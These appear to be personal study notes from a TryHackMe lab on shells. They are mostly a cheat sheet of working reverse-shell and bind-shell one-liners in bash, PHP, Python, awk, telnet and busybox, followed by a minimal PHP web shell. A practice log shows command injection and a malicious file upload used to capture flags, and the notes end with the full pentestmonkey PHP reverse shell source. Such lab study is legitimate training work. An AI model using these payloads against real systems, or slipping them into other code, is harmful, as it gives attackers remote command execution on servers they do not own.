#revshell #Shell  #Subscribers 

https://tryhackme.com/r/room/shellsoverview

reverse shell using netcat
- `-l` listen or wait
- `-v` verbose
- `-n` prevent DNS lookup
- `-p` port used for connection
- Any port can be used to wait for a connection, but attackers and pentesters tend to use known ports used by other applications like **53**, **80**, **8080**, **443**, **139**, or **445**. This is to blend the reverse shell with legitimate traffic and avoid detection by security appliances.
```
nc -lvnp 443
```

now execute the payload (rev shell) that uses a vulnerability 
- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

```
# payload names pipe reverse shell

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f

rm -f /tmp/f               rm file name f
mkfifo /tmp/f              create first in first out
cat /tmp/f                 read data from named pipe
| bash -i 2>&1             set a interactive shell, redirect errors
nc attackerIP port 
> /tmp/f                   send output to f 

```

## bind shell

 a bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely.

This method can be used when the compromised target does not allow outgoing connections, but it tends to be less popular since it needs to remain active and listen for connections, which can lead to detection.

```
# target machine

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f

# execute, wait for incoming connection

# attacker machine
nc -nv TARGET_IP 8080

nc netcat
-n disable DNS
-v verbose
```

The command above will listen for incoming connections and expose a bash shell. We need to note that ports below 1024 will require Netcat to be executed with elevated privileges. In this case, using port 8080 will avoid this.

## shell listeners

rlwrap provides keyboard editing 
```
rlwrap nc -lvnp 443
```

Ncat is newer than netcat 
```
ncat -lvnp 4444

ncat --ssl -lvnp 4444
```

socat
```
socat -d -d TCO-LISTEN:443 STDOUT

-d verbose
-d -d high verbosity
STDOUT  print in terminal 
```

## shell payload

normal bash shell
```
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```
bash read line reverse shell
```
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done

new file named 5 connects to TCP socket, read & execute commands
```
bash file descriptor 196
```
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196

file descriptor 196 to TCO connect, reads commands from network
```
bash file descriptor 5
```
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5

open interactive shell, file descriptor 5 for I/O
```

### PHP

PHP rev shell exec function
```
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```
PHP Reverse Shell Using the shell_exec Function
```
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```
PHP Reverse Shell Using the system Function
```
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```
PHP Reverse Shell Using the passthru Function
```
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```
PHP Reverse Shell Using the popen Function
```
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```

### Python

#python 

Python Reverse Shell by Exporting Environment Variables
```
export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```
Python Reverse Shell Using the subprocess Module
- `-c` execute the command as code
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```
Short Python Reverse Shell
```
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

Telnet
```
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
```

AWK
```
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

busybox
```
busybox nc ATTACKER_IP 443 -e sh
```

## web shell

A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. A web shell is usually a file containing the code that executes commands and handles files. It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers.

PHP web shell
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
upload `shell.php` to server
and can access it `http://victim.com/uploads/shell.php` 
```
http://victim.com/uploads/shell.php?cmd=whoami
```

minimal PHP web shell for RCE
https://github.com/flozz/p0wny-shell

```
https://github.com/b374k/b374k
https://www.r57shell.net/single.php?id=13
```

https://medium.com/@Z3pH7/tryhackme-shells-overview-cyber-security-101-thm-d45d8057aec1

https://www.youtube.com/watch?v=nSv589s4Fg0
## practice 

```
http://10.10.103.74:8081/

hello.txt
;ls
hello.txt;cat index.php     returns sha256  328bc672ba8234075d81256d8881cf442adb46358365f61229f2be3f1b5fa046

terminal: rlwrap nc -lvnp 443

website: hello.txt;rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.31.231 443 >/tmp/f

cd /
ls
cat flag.txt
THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}

10.10.103.74:8082     unrestricted file upload

Use the payloads learned in tasks 7 to create a file called shell.php

touch test.php > upload  = success

rlwrap nc -lvnp 1234
shell.php

10.10.103.74:8082/uploads/shell.php

terminal: ls
cat flag.txt

THM{202bb14ed12120b31300cfbbbdd35998786b44e5}

```

PHP reverse shell monkey    #php 
- `shell.php` 
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.10.10'; // attacker IP
$port = 1234;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

